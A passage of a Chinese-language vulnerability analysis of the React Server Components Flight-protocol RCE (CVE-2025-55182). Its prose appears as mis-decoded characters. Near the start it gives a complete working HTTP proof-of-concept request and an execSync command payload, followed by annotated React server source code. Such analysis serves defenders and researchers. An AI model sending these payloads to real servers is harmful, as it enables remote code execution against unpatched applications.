åˆ¤æ–­actionFnæ˜¯å¦æ˜¯å‡½æ•°ï¼Œå¦‚æœæ˜¯å°±è°ƒç”¨æ‰§è¡Œè¿™ä¸ªactionFnå‡½æ•°ï¼Œæ­£å¸¸æƒ…å†µä¸‹æ˜¯ä¼šä¼ å…¥æ­£å¸¸ä¸šåŠ¡çš„å‚æ•°çš„ï¼Œä½†è¿™é‡Œå·²ç»ä¸é‡è¦äº†ï¼Œæœ€åæ‰§è¡Œå‡ºæ¥æ˜¯

```js
vm.runInThisContext(&#34;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;id&#39;)&#34;)
```

å› æ­¤å›é¡¾ä¸€ä¸‹æ•´ä½“æµç¨‹æ˜¯ï¼š
```
å®¢æˆ·ç«¯æ„é€ æ¶æ„ multipart/form-data
        â†“
decodeAction ååºåˆ—åŒ–å‡ºæ¶æ„æœåŠ¡å™¨å‡½æ•° (actionFn)
        â†“
æœåŠ¡ç«¯è®¤ä¸ºå®ƒæ˜¯æ­£å¸¸ä¸šåŠ¡ action
        â†“
actionFn()
        â†“
å‡½æ•°å†…éƒ¨æ˜¯æ”»å‡»è€…æ„é€ çš„ payload
        â†“
vm.runInThisContext / Function / require
        â†“
child_process.execSync(&#34;calc&#34;)
        â†“
    RCE æˆåŠŸ
```

## æ¼æ´åˆ†æ2 - Flightåè®®
è¿™ä¸ªæ¼æ´åˆ†æé’ˆå¯¹çš„POCæ˜¯ï¼š
```http
POST / HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 459

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name=&#34;0&#34;

{&#34;then&#34;:&#34;$1:__proto__:then&#34;,&#34;status&#34;:&#34;resolved_model&#34;,&#34;reason&#34;:-1,&#34;value&#34;:&#34;{\&#34;then\&#34;:\&#34;$B1337\&#34;}&#34;,&#34;_response&#34;:{&#34;_prefix&#34;:&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;xcalc&#39;);&#34;,&#34;_formData&#34;:{&#34;get&#34;:&#34;$1:constructor:constructor&#34;}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name=&#34;1&#34;

&#34;$@0&#34;
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

æµç¨‹å›¾ï¼š

![img](resource/CVE-2025-55182_ReactServerComponents_RSC_RCEç ”ç©¶èµ„æ–™.assets/file-20251209141616507.png)

### Flightåè®®åˆ†æ

è¿™ä¸€æ®µåˆ†æä¸»è¦æ˜¯å‚è€ƒè…¾è®¯keenlabçš„æ–‡ç«  [ã€æ¼æ´åˆ†æã€‘CVE-2025-55182 React2shellè¿œç¨‹ä»£ç æ‰§è¡Œè§£æ](https://keenlab.tencent.com/zh/2025/12/08/2025-CVE-2025-55182/)

æ¨èå»çœ‹åŸæ–‡ï¼Œæˆ‘è¿™é‡Œç•¥ä½œæ•´ç†

#### å…¥å£å‡½æ•°ï¼šdecodeReplyFromBusboy

`decodeReplyFromBusboy`Â æ˜¯æœåŠ¡ç«¯è§£æå®¢æˆ·ç«¯ FormData çš„å…¥å£å‡½æ•°ï¼Œä½äºÂ `ReactFlightDOMServerNode.js`ï¼š

```javascript
// packages/react-server-dom-webpack/src/server/ReactFlightDOMServerNode.js
function decodeReplyFromBusboy&lt;T&gt;(
  ...
): Thenable&lt;T&gt; {
  ...
  busboyStream.on(&#39;field&#39;, (name, value) =&gt; {
    if (pendingFiles &gt; 0) {
      queuedFields.push(name, value);
    } else {
      resolveField(response, name, value);  // å¤„ç†è¡¨å•å­—æ®µ
    }
  });
```

**è°ƒç”¨é“¾ï¼š**Â `resolveField`Â â†’Â `resolveModelChunk`Â â†’Â `initializeModelChunk`

```js
// packages/react-server-dom-webpack/src/server/ReactFlightDOMServerNode.js
/**
 * æœåŠ¡ç«¯è§£æ Busboy æµå¼è¡¨å•æ•°æ®çš„æ ¸å¿ƒå‡½æ•°ï¼Œæ ¸å¿ƒä½œç”¨ï¼š
 * 1. è§£æ multipart/form-data æ ¼å¼çš„ Busboy æµï¼ŒåŒºåˆ†å¤„ç†æ™®é€šå­—æ®µå’Œæ–‡ä»¶ä¸Šä¼ ï¼›
 * 2. ä¿è¯ã€Œæ–‡ä»¶ä¼˜å…ˆã€å­—æ®µæ’é˜Ÿã€çš„è§£æé¡ºåºï¼Œé¿å…æ•°æ®ä¹±åºï¼›
 * 3. æ ¡éªŒæ–‡ä»¶ç¼–ç ï¼ˆæ‹’ç» base64ï¼‰ï¼Œé€å—å¤„ç†æ–‡ä»¶äºŒè¿›åˆ¶æ•°æ®ï¼›
 * 4. ç›‘å¬æµç”Ÿå‘½å‘¨æœŸäº‹ä»¶ï¼Œå®Œæˆå“åº”å…³é—­/é”™è¯¯ä¸ŠæŠ¥ï¼Œæœ€ç»ˆè¿”å› Flight åè®®æ ¹å“åº”ï¼›
 * 5. æ˜¯ Flight åè®®å¤„ç† Server Actions è¡¨å•æäº¤çš„æ ¸å¿ƒå…¥å£ã€‚
 * 
 * @template T - Flight åè®®å“åº”çš„æ ¹æ•°æ®ç±»å‹ï¼ˆæ³›å‹é€‚é…ä¸åŒå“åº”åœºæ™¯ï¼‰
 * @param {Busboy} busboyStream - Busboy è§£ææµï¼Œå¤„ç† multipart/form-data æ ¼å¼æ ¸å¿ƒæµ
 * @param {ServerManifest} webpackMap - React æœåŠ¡ç«¯çš„ webpack æ„å»ºæ¸…å•
 * @param {Object=} options - å¯é€‰é…ç½®é¡¹ï¼ŒåŒ…å«ä¸´æ—¶å¼•ç”¨é›†åˆï¼ˆtemporaryReferencesï¼‰
 * @param {TemporaryReferenceSet=} options.temporaryReferences - Flight åè®®çš„ä¸´æ—¶å¼•ç”¨ç¼“å­˜ï¼Œè§£å†³å¾ªç¯å¼•ç”¨é—®é¢˜
 * @returns {Thenable&lt;T&gt;} - Flight åè®®è§£æå®Œæˆçš„æ ¹å“åº”ï¼ˆPromise ç±»å‹ï¼Œé€‚é…å¼‚æ­¥è§£æï¼‰
 */
function decodeReplyFromBusboy&lt;T&gt;(
  busboyStream: Busboy,
  webpackMap: ServerManifest,
  options?: {temporaryReferences?: TemporaryReferenceSet},
): Thenable&lt;T&gt; {
  // ========== æ­¥éª¤1ï¼šåˆå§‹åŒ– Flight åè®®å“åº”å¯¹è±¡ ==========
  const response = createResponse(
    webpackMap,
    &#39;&#39;,
    options ? options.temporaryReferences : undefined,
  );
  let pendingFiles = 0;
  const queuedFields: Array&lt;string&gt; = [];
  // ========== æ­¥éª¤2ï¼šç›‘å¬æ™®é€šè¡¨å•å­—æ®µäº‹ä»¶ï¼ˆfieldï¼‰ ==========
  busboyStream.on(&#39;field&#39;, (name, value) =&gt; {
    if (pendingFiles &gt; 0) {
      // æ–‡ä»¶æœªå¤„ç†å®Œæˆæ—¶ï¼Œå°†å­—æ®µå­˜å…¥é˜Ÿåˆ—ï¼Œé¿å…å­—æ®µä¸æ–‡ä»¶è§£æä¹±åº
      queuedFields.push(name, value);
    } else {
      // æ— æ–‡ä»¶å¤„ç†æ—¶ï¼Œç›´æ¥å¤„ç†è¡¨å•å­—æ®µï¼Œè§£æå­—æ®µå¹¶å…³è”åˆ°å“åº”å¯¹è±¡
      resolveField(response, name, value);
    }
  });

  // ========== æ­¥éª¤3ï¼šç›‘å¬æ–‡ä»¶ä¸Šä¼ äº‹ä»¶ï¼ˆfileï¼‰ ==========
  busboyStream.on(&#39;file&#39;, (name, value, {filename, encoding, mimeType}) =&gt; {
    â€¦â€¦â€¦â€¦
  });
  // ========== æ­¥éª¤4ï¼šç›‘å¬Busboyæµå®Œæˆäº‹ä»¶ ==========
  busboyStream.on(&#39;finish&#39;, () =&gt; {
    close(response);
  });
  // ========== æ­¥éª¤5ï¼šç›‘å¬Busboyæµé”™è¯¯äº‹ä»¶ ==========
  busboyStream.on(&#39;error&#39;, err =&gt; {
    â€¦â€¦â€¦â€¦
  });
  // ========== æ­¥éª¤6ï¼šè¿”å›Flightåè®®çš„æ ¹å“åº”æ•°æ® ==========
  return getRoot(response);
}
```

è¯¦ç»†è¯´æ˜ï¼š

è¯¥å‡½æ•°æ˜¯ **React RSC/Flight åè®®ä½“ç³»ä¸‹ï¼ŒæœåŠ¡ç«¯è§£æ Busboy æµå¼è¡¨å•æ•°æ®ï¼ˆ`multipart/form-data`ï¼‰çš„æ ¸å¿ƒå‡½æ•°**ï¼Œæ˜¯ Flight åè®®å¤„ç†å®¢æˆ·ç«¯è¡¨å•æäº¤ï¼ˆå¦‚ Server Actionsï¼‰çš„å…³é”®å…¥å£ã€‚æ ¸å¿ƒåŠŸèƒ½å¯æ‹†è§£ä¸ºï¼š
1. **åˆå§‹åŒ–å“åº”å¯¹è±¡**ï¼šåˆ›å»º Flight åè®®çš„å“åº”å®¹å™¨ï¼Œå…³è” webpack æ˜ å°„å’Œä¸´æ—¶å¼•ç”¨é…ç½®ï¼›
2. **åˆ†ç±»å‹è§£æè¡¨å•æ•°æ®**ï¼šåŒºåˆ†å¤„ç†æ™®é€šè¡¨å•å­—æ®µå’Œæ–‡ä»¶ä¸Šä¼ ï¼Œä¿è¯æ–‡ä»¶æœªå¤„ç†å®Œæˆæ—¶æ™®é€šå­—æ®µå…ˆæ’é˜Ÿï¼›
    - æ™®é€šå­—æ®µï¼ˆ`field`ï¼‰ï¼šæ–‡ä»¶æœªå¤„ç†å®Œæˆæ—¶æš‚å­˜é˜Ÿåˆ—ï¼Œæ–‡ä»¶å¤„ç†å®Œæ¯•åæ‰¹é‡è§£æï¼Œä¿è¯å­—æ®µä¸æ–‡ä»¶çš„è§£æé¡ºåºï¼›
    - æ–‡ä»¶å­—æ®µï¼ˆ`file`ï¼‰ï¼šæ ¡éªŒç¼–ç ï¼ˆæ‹’ç» base64ï¼‰ï¼Œé€å—æ¥æ”¶æ–‡ä»¶äºŒè¿›åˆ¶æ•°æ®å¹¶å°è£…ä¸º Blob å¯¹è±¡ï¼Œæ·»åŠ åˆ°å“åº”çš„ FormData ä¸­ï¼Œå®Œæˆåæ¸…ç†é˜Ÿåˆ—å¹¶è§£ææš‚å­˜å­—æ®µï¼›
3. **ç”Ÿå‘½å‘¨æœŸä¸å¼‚å¸¸å¤„ç†**ï¼šç›‘å¬ Busboy æµçš„å®Œæˆ / é”™è¯¯äº‹ä»¶ï¼Œå®Œæˆå“åº”å…³é—­æˆ–å…¨å±€é”™è¯¯ä¸ŠæŠ¥ï¼›
4. **è¿”å›æ ¹å“åº”æ•°æ®**ï¼šæœ€ç»ˆè¿”å›è§£æå®Œæˆçš„ Flight åè®®æ ¹å“åº”ï¼Œä¾›åç»­åºåˆ—åŒ–ä¼ è¾“ï¼›

æ•´ä½“å®ç°äº†ã€Œæ–‡ä»¶ä¼˜å…ˆã€å­—æ®µæ’é˜Ÿã€çš„è¡¨å•è§£æè§„åˆ™ï¼Œä¿è¯ Flight åè®®ä¸‹è¡¨å•æ•°æ®ï¼ˆå«æ–‡ä»¶ï¼‰çš„å®Œæ•´ã€æœ‰åºè§£æï¼Œæ”¯æ’‘ Server Actions çš„è¡¨å•æäº¤é“¾è·¯ã€‚



#### å­—æ®µè§£æï¼šresolveField

è¯¥å‡½æ•°æ˜¯ **RSC Flight åè®®ä½“ç³»ä¸‹å¤„ç†è¡¨å•å­—æ®µçš„æ ¸å¿ƒå·¥å…·å‡½æ•°**ï¼Œæ ¸å¿ƒä½œç”¨ä¸ºï¼š
1. å…ˆå°†è¡¨å•å­—æ®µï¼ˆé”®å€¼å¯¹ï¼‰æ·»åŠ åˆ°å“åº”å¯¹è±¡çš„ FormData ä¸­ï¼Œä¿è¯è¡¨å•æ•°æ®çš„å®Œæ•´å­˜å‚¨ï¼›
2. æ ¡éªŒå­—æ®µåæ˜¯å¦ä»¥å“åº”å¯¹è±¡çš„é¢„è®¾å‰ç¼€å¼€å¤´ï¼ˆé€šå¸¸æ˜¯ RSC/Flight åè®®çš„ç‰¹æ®Šæ ‡è¯†å‰ç¼€ï¼‰ï¼›
3. è‹¥åŒ¹é…å‰ç¼€ï¼Œæå–å­—æ®µåä¸­çš„ã€Œå— IDã€ï¼Œä»å“åº”çš„å—ç¼“å­˜ä¸­æ‰¾åˆ°å¯¹åº”æ¨¡å‹å—ï¼Œè°ƒç”¨ `resolveModelChunk` è§£æè¯¥å—çš„å†…å®¹ï¼ˆå®Œæˆæ¨¡å‹å—ä¸å­—æ®µå€¼çš„å…³è”ï¼‰ã€‚
   

æ•´ä½“æ˜¯ Flight åè®®ä¸­ã€Œè¡¨å•å­—æ®µ â†’ æ¨¡å‹å—ã€æ˜ å°„è§£æçš„å…³é”®æ­¥éª¤ï¼Œæ”¯æ’‘æœåŠ¡ç«¯å¯¹ç‰¹æ®Šæ ‡è®°å­—æ®µçš„ç²¾å‡†å¤„ç†ã€‚
```javascript
// packages/react-server/src/ReactFlightReplyServer.js
/**
* è§£æå¹¶å…³è”è¡¨å•å­—æ®µåˆ°å“åº”å¯¹è±¡åŠå¯¹åº”æ¨¡å‹å—ï¼Œæ ¸å¿ƒä½œç”¨ï¼š
* 1. å°†è¡¨å•å­—æ®µå­˜å…¥å“åº”çš„FormDataï¼Œä¿è¯åŸºç¡€æ•°æ®å­˜å‚¨ï¼›
* 2. è¯†åˆ«å¸¦RSC/Flightåè®®å‰ç¼€çš„ç‰¹æ®Šå­—æ®µï¼Œæå–æ¨¡å‹å—IDå¹¶è§£æå¯¹åº”æ¨¡å‹å—ï¼›
* 3. æ˜¯æœåŠ¡ç«¯å¤„ç†è¡¨å•æäº¤ï¼ˆå¦‚Server Actionsï¼‰æ—¶ï¼Œå…³è”å­—æ®µä¸æ¨¡å‹å—çš„æ ¸å¿ƒé€»è¾‘ã€‚
*
* @param {Response} response - Flightåè®®çš„å“åº”å¯¹è±¡ï¼ŒåŒ…å«FormDataã€æ¨¡å‹å—ç¼“å­˜ã€å‰ç¼€æ ‡è¯†ç­‰æ ¸å¿ƒå±æ€§
* @param {string} key - è¡¨å•å­—æ®µåï¼ˆæ™®é€šå­—æ®µ/å¸¦RSCå‰ç¼€çš„ç‰¹æ®Šå­—æ®µï¼‰
* @param {string} value - è¡¨å•å­—æ®µå€¼
* @returns {void} - æ— è¿”å›å€¼ï¼Œç›´æ¥ä¿®æ”¹responseå¯¹è±¡çš„å†…éƒ¨çŠ¶æ€
*/
export function resolveField(
  response: Response,
  key: string,
  value: string,
): void {
  // 1. åŸºç¡€æ“ä½œï¼šå°†å½“å‰è¡¨å•å­—æ®µï¼ˆé”®å€¼å¯¹ï¼‰æ·»åŠ åˆ°å“åº”å¯¹è±¡çš„FormDataä¸­
  response._formData.append(key, value);
  // 2. è·å–å“åº”å¯¹è±¡ä¸­é¢„è®¾çš„Flightåè®®å‰ç¼€ï¼ˆå¦‚&#34;$MODEL_CHUNK_&#34;ç­‰ç‰¹æ®Šæ ‡è¯†ï¼‰
  const prefix = response._prefix;
  // 3. æ ¡éªŒï¼šå½“å‰å­—æ®µæ˜¯å¦ä¸ºFlightåè®®æ ‡è®°çš„ã€Œæ¨¡å‹å—å…³è”å­—æ®µã€
  if (key.startsWith(prefix)) {
    // 3.1 ä»å“åº”å¯¹è±¡ä¸­è·å–æ¨¡å‹å—ç¼“å­˜ï¼ˆMapç»“æ„ï¼Œkeyä¸ºå—IDï¼Œvalueä¸ºæ¨¡å‹å—æ•°æ®ï¼‰
    const chunks = response._chunks;
    // 3.2 æå–å­—æ®µåä¸­å‰ç¼€åçš„éƒ¨åˆ†ï¼Œè½¬ä¸ºæ•°å­—ç±»å‹çš„æ¨¡å‹å—ID
    const id = &#43;key.slice(prefix.length);
    // 3.3 ä»ç¼“å­˜ä¸­è·å–è¯¥IDå¯¹åº”çš„æ¨¡å‹å—
    const chunk = chunks.get(id);
    // 4. è‹¥æ¨¡å‹å—å­˜åœ¨ï¼Œè°ƒç”¨resolveModelChunkè§£æè¯¥å—ï¼ˆå…³è”å­—æ®µå€¼ä¸æ¨¡å‹å—ï¼‰
    if (chunk) {
      // æ ¸å¿ƒï¼šå°†å­—æ®µå€¼æ³¨å…¥å¯¹åº”æ¨¡å‹å—ï¼Œå®Œæˆæ¨¡å‹å—çš„è§£æ/åˆå§‹åŒ–
      resolveModelChunk(chunk, value, id);  
    }
  }
}
```




#### æ¨¡å‹å—è§£æ resolveModelChunk

è¯¥å‡½æ•°æ˜¯ **RSC Flight åè®®ä½“ç³»ä¸‹è§£ææ¨¡å‹å—ï¼ˆModel Chunkï¼‰çš„æ ¸å¿ƒæ³›å‹å‡½æ•°**ï¼Œæ˜¯ Flight åè®®ååºåˆ—åŒ–ä¸­æ¨¡å‹å—çŠ¶æ€ç®¡ç†ä¸æ•°æ®è§£æçš„å…³é”®ç¯èŠ‚ã€‚æ ¸å¿ƒåŠŸèƒ½å¯æ‹†è§£ä¸ºï¼š

1. **éæŒ‚èµ·çŠ¶æ€å¤„ç†**ï¼šè‹¥æ¨¡å‹å—å·²è„±ç¦» `PENDING` çŠ¶æ€ï¼Œåˆ¤å®šä¸ºæµå¼æ•°æ®å—ï¼Œæ ¹æ®ç‰¹æ®Šæ ‡è®°ï¼ˆ`C` å¼€å¤´ï¼‰æ‰§è¡Œã€Œå…³é—­æµæ§åˆ¶å™¨ã€æˆ–ã€Œå…¥é˜Ÿæ¨¡å‹æ•°æ®ã€æ“ä½œï¼›
2. **æŒ‚èµ·çŠ¶æ€å¤„ç†**ï¼šè‹¥æ¨¡å‹å—å¤„äº `PENDING` çŠ¶æ€ï¼Œæ ‡è®°ä¸ºã€Œå·²è§£ææ¨¡å‹ã€çŠ¶æ€ï¼Œå­˜å‚¨è§£æå€¼ä¸ IDï¼Œè§¦å‘æ¨¡å‹å—åˆå§‹åŒ–ï¼›
3. ç›‘å¬å™¨å”¤é†’ï¼šåˆå§‹åŒ–åæ£€æŸ¥æ¨¡å‹å—æœ€ç»ˆçŠ¶æ€ï¼Œå”¤é†’å…³è”çš„æˆåŠŸ / å¤±è´¥ç›‘å¬å™¨ï¼Œå®Œæˆå¼‚æ­¥å›è°ƒçš„æ‰§è¡Œï¼›

æ•´ä½“å®ç°äº†æ¨¡å‹å—ã€ŒæŒ‚èµ·â†’è§£æâ†’å›è°ƒã€çš„å®Œæ•´ç”Ÿå‘½å‘¨æœŸç®¡ç†ï¼Œé€‚é… Flight åè®®çš„æµå¼æ•°æ®è§£æä¸å¼‚æ­¥æ¨¡å‹è¿˜åŸé€»è¾‘ã€‚

```js
// packages/react-server/src/ReactFlightReplyServer.js
/**
 * è§£ææ¨¡å‹å—ï¼ˆModel Chunkï¼‰çš„æ ¸å¿ƒæ³›å‹å‡½æ•°,æ ¸å¿ƒä½œç”¨ï¼š
 * 1. åŒºåˆ†æ¨¡å‹å—çŠ¶æ€æ‰§è¡Œå·®å¼‚åŒ–é€»è¾‘ï¼š
 *    - éPENDINGï¼šæŒ‰æµå¼æ•°æ®å—å¤„ç†ï¼Œæ§åˆ¶æµçš„å…³é—­/æ•°æ®å…¥é˜Ÿï¼›
 *    - PENDINGï¼šæ ‡è®°ä¸ºå·²è§£æçŠ¶æ€ï¼Œåˆå§‹åŒ–æ¨¡å‹å¹¶å”¤é†’ç›‘å¬å™¨ï¼›
 * 2. é€‚é… Flight åè®®çš„æµå¼æ•°æ®è§£æä¸å¼‚æ­¥æ¨¡å‹è¿˜åŸï¼Œç®¡ç†æ¨¡å‹å—å®Œæ•´ç”Ÿå‘½å‘¨æœŸï¼›
 * 3. æ˜¯ Flight åè®®ååºåˆ—åŒ–ä¸­æ¨¡å‹å—çŠ¶æ€åŒæ­¥ã€å›è°ƒæ‰§è¡Œçš„å…³é”®ç¯èŠ‚ã€‚
 * 
 * @template T - æ¨¡å‹å—å­˜å‚¨çš„æ•°æ®ç±»å‹ï¼ˆæ³›å‹é€‚é…ä¸åŒæ¨¡å‹æ•°æ®ï¼‰
 * @param {SomeChunk&lt;T&gt;} chunk - å¾…å¤„ç†çš„æ¨¡å‹å—å¯¹è±¡ï¼ŒåŒ…å«çŠ¶æ€ã€å€¼ã€åŸå› ç­‰æ ¸å¿ƒå±æ€§
 * @param {string} value - è§£æåçš„æ¨¡å‹å­—ç¬¦ä¸²æ•°æ®ï¼ˆFlight åºåˆ—åŒ–æ•°æ®ï¼‰
 * @param {number} id - æ¨¡å‹å—çš„å”¯ä¸€æ ‡è¯†IDï¼ˆå…³è” Flight åè®®å¼•ç”¨ï¼‰
 * @returns {void} - æ— è¿”å›å€¼ï¼Œç›´æ¥ä¿®æ”¹æ¨¡å‹å—çš„å†…éƒ¨çŠ¶æ€ä¸å…³è”æ§åˆ¶å™¨/ç›‘å¬å™¨
 */
function resolveModelChunk&lt;T&gt;(
  chunk: SomeChunk&lt;T&gt;,
  value: string,
  id: number,
): void {
  // ========== åˆ†æ”¯1ï¼šæ¨¡å‹å—éPENDINGçŠ¶æ€ï¼ˆå·²è§£æ/æµå¼æ•°æ®å—ï¼‰ ==========
  if (chunk.status !== PENDING) {
		â€¦â€¦â€¦â€¦
  }

  // ========== åˆ†æ”¯2ï¼šæ¨¡å‹å—å¤„äºPENDINGçŠ¶æ€ï¼ˆå¾…è§£æï¼‰ ==========
  // æå–æ¨¡å‹å—çš„æˆåŠŸ/å¤±è´¥ç›‘å¬å™¨é˜Ÿåˆ—ï¼ˆå¼‚æ­¥å›è°ƒï¼‰
  const resolveListeners = chunk.value;
  const rejectListeners = chunk.reason;

  // ç±»å‹æ–­è¨€ï¼šå°†PENDINGçŠ¶æ€çš„æ¨¡å‹å—è½¬ä¸ºå·²è§£ææ¨¡å‹å—
  const resolvedChunk: ResolvedModelChunk&lt;T&gt; = (chunk: any);
  // æ ‡è®°æ¨¡å‹å—çŠ¶æ€ä¸ºã€Œå·²è§£ææ¨¡å‹ã€ï¼ˆRESOLVED_MODELï¼‰
  resolvedChunk.status = RESOLVED_MODEL;
  // å­˜å‚¨è§£æåçš„æ¨¡å‹æ•°æ®
  resolvedChunk.value = value;
  // å­˜å‚¨æ¨¡å‹å—å”¯ä¸€ID
  resolvedChunk.reason = id;

  // è‹¥å­˜åœ¨æˆåŠŸç›‘å¬å™¨ï¼Œæ‰§è¡Œæ¨¡å‹åˆå§‹åŒ–å¹¶å”¤é†’ç›‘å¬å™¨
  if (resolveListeners !== null) {
    // æ³¨é‡Šï¼šè‹¥å·²ç»‘å®šç›‘å¬å™¨æ—¶æå‰è¯»å–æ•°æ®ï¼Œå¯èƒ½å­˜åœ¨ç›‘å¬å™¨å·²å¤±æ•ˆ/éæœ€é«˜ä¼˜å…ˆçº§çš„é—®é¢˜ï¼ˆå·²çŸ¥è®¾è®¡å–èˆï¼‰
    // æ ¸å¿ƒæ“ä½œï¼šåˆå§‹åŒ–æ¨¡å‹å—ï¼ˆå°†åºåˆ—åŒ–æ•°æ®è½¬ä¸ºå¯è¿è¡Œçš„ç»„ä»¶æ¨¡å‹ï¼‰
    initializeModelChunk(resolvedChunk);

    // åˆå§‹åŒ–åæ¨¡å‹å—çŠ¶æ€å¯èƒ½å˜æ›´ï¼Œæ£€æŸ¥å¹¶å”¤é†’ç›‘å¬å™¨ï¼Œä¼ é€’å½“å‰æ¨¡å‹å—ã€æˆåŠŸ/å¤±è´¥ç›‘å¬å™¨ï¼Œå®Œæˆå¼‚æ­¥å›è°ƒæ‰§è¡Œ
    wakeChunkIfInitialized(chunk, resolveListeners, rejectListeners);
  }
}
```



**çŠ¶æ€åˆ†æ”¯çš„æ ¸å¿ƒè®¾è®¡**ï¼š

- é `PENDING` çŠ¶æ€åˆ¤å®šä¸ºã€Œæµå¼æ•°æ®å—ã€ï¼Œé€šè¿‡ `controller` å¤„ç†æµçš„å…³é—­ / æ•°æ®å…¥é˜Ÿï¼Œé€‚é… Flight åè®®çš„æµå¼æ¸²æŸ“ç‰¹æ€§ï¼›
- `PENDING` çŠ¶æ€æ˜¯æ¨¡å‹å—çš„åˆå§‹çŠ¶æ€ï¼Œå®Œæˆã€Œæ ‡è®°è§£æçŠ¶æ€â†’å­˜å‚¨æ•°æ®â†’åˆå§‹åŒ–â†’å”¤é†’ç›‘å¬å™¨ã€çš„é—­ç¯ï¼Œæ˜¯åŒæ­¥æ¨¡å‹æ•°æ®çš„æ ¸å¿ƒé“¾è·¯ã€‚

**æµå¼æ•°æ®çš„ç‰¹æ®Šæ ‡è®°**ï¼š

- `value[0] === &#39;C&#39;` æ˜¯ Flight åè®®çº¦å®šçš„ã€Œæµå…³é—­ã€æ ‡è®°ï¼Œå¯¹åº” `controller.close()`ï¼Œç”¨äºç»ˆæ­¢æµå¼æ•°æ®çš„è§£æï¼›
- é `C` å¼€å¤´çš„æ•°æ®é€šè¿‡ `enqueueModel` å…¥é˜Ÿï¼Œä¿è¯æµå¼æ•°æ®çš„å¢é‡è§£æã€‚

**æ³›å‹ä¸ç±»å‹æ–­è¨€çš„ä½œç”¨**ï¼š

- æ³›å‹ `T` é€‚é…ä¸åŒç±»å‹çš„æ¨¡å‹æ•°æ®ï¼ˆå¦‚ç»„ä»¶ã€è¡¨å•ã€äºŒè¿›åˆ¶æ•°æ®ï¼‰ï¼Œæå‡å‡½æ•°å¤ç”¨æ€§ï¼›
- ç±»å‹æ–­è¨€ï¼ˆ`chunk: any`ï¼‰æ˜¯ Flight åè®®å†…éƒ¨ç®€åŒ–ç±»å‹å¤„ç†çš„è®¾è®¡ï¼Œé¿å…å¤æ‚çš„ç±»å‹åˆ†æ”¯ï¼Œä»£ä»·æ˜¯ç‰ºç‰²éƒ¨åˆ†ç±»å‹å®‰å…¨æ€§ã€‚

**ç›‘å¬å™¨å”¤é†’çš„æ—¶æœº**ï¼š

- `initializeModelChunk` åè°ƒç”¨ `wakeChunkIfInitialized`ï¼Œå› ä¸ºåˆå§‹åŒ–å¯èƒ½æ”¹å˜æ¨¡å‹å—çŠ¶æ€ï¼ˆå¦‚ `fulfilled`/`rejected`ï¼‰ï¼Œéœ€æ ¹æ®æœ€ç»ˆçŠ¶æ€å”¤é†’å¯¹åº”ç›‘å¬å™¨ï¼›
- æ³¨é‡Šä¸­æåˆ°çš„ã€Œç›‘å¬å™¨å¯èƒ½å¤±æ•ˆã€æ˜¯å·²çŸ¥è®¾è®¡å–èˆï¼Œä¼˜å…ˆä¿è¯è§£ææ•ˆç‡è€Œéæè‡´çš„ç›‘å¬å™¨æ ¡éªŒã€‚



#### æ ¸å¿ƒè§£ç é€»è¾‘ï¼šinitializeModelChunk

è¯¥å‡½æ•°æ˜¯ **RSC Flight åè®®ä½“ç³»ä¸‹åˆå§‹åŒ–æ¨¡å‹å—ï¼ˆModel Chunkï¼‰çš„æ ¸å¿ƒæ³›å‹å‡½æ•°**ï¼Œæ˜¯ Flight åè®®ååºåˆ—åŒ–ä¸­ã€ŒåŸå§‹åºåˆ—åŒ–æ•°æ® â†’ å¯è¿è¡Œç»„ä»¶æ¨¡å‹ã€çš„å…³é”®è½¬æ¢ç¯èŠ‚ã€‚æ ¸å¿ƒåŠŸèƒ½å¯æ‹†è§£ä¸ºï¼š
1. **å…¨å±€çŠ¶æ€ä¿æŠ¤**ï¼šæš‚å­˜å¹¶æ¢å¤å…¨å±€çš„ã€Œåˆå§‹åŒ–ä¸­æ¨¡å‹å—ã€çŠ¶æ€ï¼Œé¿å…å¹¶å‘åˆå§‹åŒ–å¯¼è‡´çš„å†²çªï¼›
2. **åˆå§‹çŠ¶æ€æ ‡è®°**ï¼šå°†æ¨¡å‹å—å…ˆæ ‡è®°ä¸º `CYCLIC`ï¼ˆå¾ªç¯å¼•ç”¨ï¼‰çŠ¶æ€ï¼Œé˜²æ­¢è§£æè¿‡ç¨‹ä¸­é‡å¤åˆå§‹åŒ–ï¼›
3. **æ•°æ®è§£æä¸è¿˜åŸ**ï¼šè§£æåºåˆ—åŒ–çš„ JSON å­—ç¬¦ä¸²ï¼Œé€šè¿‡ `reviveModel` é€’å½’è¿˜åŸä¸ºå¸¦ç±»å‹çš„ç»„ä»¶æ¨¡å‹ï¼›
4. **çŠ¶æ€åˆ†æ”¯å¤„ç†**ï¼š
    - å­˜åœ¨æœªè§£æä¾èµ–ï¼šæ ‡è®°ä¸º `BLOCKED`ï¼ˆé˜»å¡ï¼‰çŠ¶æ€ï¼Œç­‰å¾…ä¾èµ–è§£æå®Œæˆï¼›
    - æ— æœªè§£æä¾èµ–ï¼šæ ‡è®°ä¸º `INITIALIZED`ï¼ˆå·²åˆå§‹åŒ–ï¼‰çŠ¶æ€ï¼Œå”¤é†’æˆåŠŸç›‘å¬å™¨ï¼›
5. **å¼‚å¸¸å¤„ç†**ï¼šæ•è·è§£æ / è¿˜åŸè¿‡ç¨‹ä¸­çš„å¼‚å¸¸ï¼Œæ ‡è®°ä¸º `ERRORED`ï¼ˆé”™è¯¯ï¼‰çŠ¶æ€ï¼›

æ•´ä½“å®ç°äº†æ¨¡å‹å—ä»ã€Œå·²è§£ææ ‡è®°ã€åˆ°ã€Œå¾ªç¯â†’é˜»å¡ / åˆå§‹åŒ– / é”™è¯¯ã€çš„çŠ¶æ€æµè½¬ï¼Œæ˜¯ Flight åè®®å¤„ç†å¤æ‚ç»„ä»¶æ¨¡å‹ï¼ˆå«å¾ªç¯å¼•ç”¨ã€ä¾èµ–é˜»å¡ï¼‰çš„æ ¸å¿ƒé€»è¾‘ã€‚

```js
// packages/react-server/src/ReactFlightReplyServer.js  
/**
